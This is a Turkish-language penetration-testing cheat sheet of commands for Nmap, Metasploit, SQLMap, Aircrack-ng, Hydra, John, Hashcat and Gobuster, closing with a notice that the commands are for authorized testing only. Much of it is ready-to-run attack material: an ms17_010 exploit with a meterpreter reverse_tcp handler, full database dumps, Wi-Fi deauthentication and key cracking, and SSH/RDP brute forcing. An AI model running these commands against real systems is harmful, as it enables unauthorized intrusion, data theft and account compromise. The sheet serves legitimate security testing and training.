# Güvenlik Araçları Hızlı Referans Rehberi

## Nmap Komutları

```bash
# Basit tarama
nmap 192.168.1.100

# Detaylı tarama
nmap -sV -A 192.168.1.100

# Tüm portlar
nmap -p- 192.168.1.100

# UDP taraması
nmap -sU 192.168.1.100

# Dosyaya kaydet
nmap -sV -A 192.168.1.100 -oN results.txt

# XML çıktısı
nmap -sV -A 192.168.1.100 -oX results.xml

# İşletim sistemi tespiti
nmap -O 192.168.1.100

# Ağ keşfi
nmap -sn 192.168.1.0/24
```

## Metasploit Komutları

```bash
# Msfconsole başlat
msfconsole

# Modül ara
search exploit/windows/smb

# Modülü seç
use exploit/windows/smb/ms17_010

# Seçenekleri göster
show options

# Payload göster
show payload

# Hedef ayarla
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

# Exploit çalıştır
run

# Handler kullan
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
```

## SQLMap Komutları

```bash
# Basit SQL injection testi
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Tablo listele
sqlmap -u "http://example.com/page.php?id=1" -D database --tables

# Veri dump
sqlmap -u "http://example.com/page.php?id=1" -D database -T table --dump

# Tüm veri dump
sqlmap -u "http://example.com/page.php?id=1" --dump-all

# POST isteği
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=123" -p user

# Admin bulma
sqlmap -u "http://example.com/page.php?id=1" --roles
```

## Aircrack-ng Komutları

```bash
# Monitor modu aç
sudo airmon-ng start wlan0

# WiFi ağları tara
sudo airodump-ng wlan0mon

# Hedef ağı izle
sudo airodump-ng -c 6 -bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Handshake yakala
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Şifre kırma
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Monitor modu kapat
sudo airmon-ng stop wlan0mon
```

## Hydra Komutları

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh

# FTP brute force
hydra -L users.txt -P pass.txt ftp://192.168.1.100

# HTTP POST
hydra -L users.txt -P pass.txt http-post-form://example.com/login.php:"user=^USER^&pass=^PASS^" -e nsr

# VNC
hydra -P pass.txt vnc://192.168.1.100

# RDP
hydra -L users.txt -P pass.txt rdp://192.168.1.100
```

## John the Ripper Komutları

```bash
# Temel hash kırma
john --wordlist=wordlist.txt hashes.txt

# Format belirt
john --format=md5 --wordlist=wordlist.txt hashes.txt

# Belirli user için
john --wordlist=wordlist.txt --users=admin hashes.txt

# Sonuçları göster
john --show hashes.txt

# Brute force
john --incremental=Digits hashes.txt

# Restore
john --restore
```

## Hashcat Komutları

```bash
# MD5 kırma
hashcat -m 0 hashes.txt wordlist.txt

# SHA1
hashcat -m 100 hashes.txt wordlist.txt

# SHA256
hashcat -m 1400 hashes.txt wordlist.txt

# bcrypt
hashcat -m 3200 hashes.txt wordlist.txt

# Mask attack
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a

# Rule kullan
hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule

# GPU seçimi
hashcat -D 2 -m 0 hashes.txt wordlist.txt
```

## Wireshark Filtreleri

```bash
# HTTP trafiği
http

# SSH trafiği
ssh

# DNS sorguları
dns

# TCP portu
tcp.port == 80

# IP adresi
ip.addr == 192.168.1.100

# HTTPS
https

# Belirli kaynak
ip.src == 192.168.1.100

# Belirli hedef
ip.dst == 192.168.1.100

# Port aralığı
tcp.port >= 1000 && tcp.port <= 2000
```

## Gobuster Komutları

```bash
# Dizin taraması
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster.txt

# DNS subdomain
gobuster dns -d example.com -w subdomains.txt

# VHost taraması
gobuster vhost -u http://example.com -w vhosts.txt

# Thread sayısı
gobuster dir -u http://example.com -w wordlist.txt -t 100

# Uzantı filtresi
gobuster dir -u http://example.com -w wordlist.txt -x .php,.html

# Status kodları
gobuster dir -u http://example.com -w wordlist.txt -s "200,204,301"
```

## Burp Suite Temel Kullanım

```bash
# Burp Suite başlat
burpsuite

# Proxy ayarla: 127.0.0.1:8080

# İstekleri yakala
# Browser'da proxy ayarla

# Tarama başlat
# Target → Site Map → Scanner

# Intruder kullan
# Positions → Payloads → Start Attack

# Repeater kullan
# İsteği düzenle ve yeniden gönder
```

## Certutil İle Hash Kontrol

```bash
# MD5
certutil -hashfile file.txt MD5

# SHA1
certutil -hashfile file.txt SHA1

# SHA256
certutil -hashfile file.txt SHA256
```

## Bash Hızlı İpuçları

```bash
# IP'den Port Tarama
for i in {1..65535}; do timeout 1 bash -c "</dev/null >& /dev/tcp/192.168.1.100/$i" 2>/dev/null && echo "Port $i açık"; done

# Subdomain Brute Force
for sub in www mail ftp admin; do
  dig $sub.example.com +short
done

# HTTP Response Kodu Kontrol
curl -I http://example.com

# Base64 Encode
echo "text" | base64

# Base64 Decode
echo "dGV4dA==" | base64 -d

# MD5 Hash
echo -n "text" | md5sum

# SHA256 Hash
echo -n "text" | sha256sum

# Hex to String
echo "48656c6c6f" | xxd -r -p

# String to Hex
echo -n "Hello" | xxd -p
```

## Sık Karşılaşılan Port Numaraları

| Port | Hizmet |
|------|--------|
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 143 | IMAP |
| 443 | HTTPS |
| 445 | SMB |
| 3306 | MySQL |
| 3389 | RDP |
| 5432 | PostgreSQL |
| 5900 | VNC |
| 8080 | HTTP Alt |
| 8443 | HTTPS Alt |

---

⚠️ **YASAL UYARI**: Bu komutlar yalnızca yetkili testler için kullanılabilir!
